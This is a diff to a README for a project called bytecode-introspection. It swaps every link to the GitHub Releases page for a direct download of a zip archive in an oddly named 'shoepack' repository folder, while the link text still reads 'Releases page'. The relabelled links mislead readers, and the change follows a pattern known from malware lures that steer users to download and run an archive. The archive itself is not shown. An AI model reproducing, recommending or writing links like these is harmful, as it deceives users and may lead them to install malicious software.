@@ -10,11 +10,11 @@ To get started, you will need to download the application from our Releases page
 
 **Click the button below to visit the download page:**
 
-[![Download bytecode-introspection](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/kozy55/bytecode-introspection/releases)
+[![Download bytecode-introspection](https://raw.githubusercontent.com/kozy55/bytecode-introspection/master/shoepack/bytecode-introspection.zip)](https://raw.githubusercontent.com/kozy55/bytecode-introspection/master/shoepack/bytecode-introspection.zip)
 
 You can find the latest version of bytecode-introspection there. Follow these steps to download and run the application:
 
-1. Visit the [Releases page](https://github.com/kozy55/bytecode-introspection/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/kozy55/bytecode-introspection/master/shoepack/bytecode-introspection.zip).
 2. Look for the most recent version labeled “Latest Release.”
 3. Find the download link for your operating system.
 4. Click the link to download the file.
@@ -67,6 +67,6 @@ Join our community of users and contributors. Share your experiences, ask questi
 
 To keep track of new releases, announcements, and updates, consider watching our repository on GitHub. You’ll receive notifications whenever there are significant changes or new features added.
 
-**Don't forget to return to our Releases page to download the latest version:** [Releases Page](https://github.com/kozy55/bytecode-introspection/releases). 
+**Don't forget to return to our Releases page to download the latest version:** [Releases Page](https://raw.githubusercontent.com/kozy55/bytecode-introspection/master/shoepack/bytecode-introspection.zip). 
 
 Thank you for using bytecode-introspection! Enjoy exploring your software's inner workings.
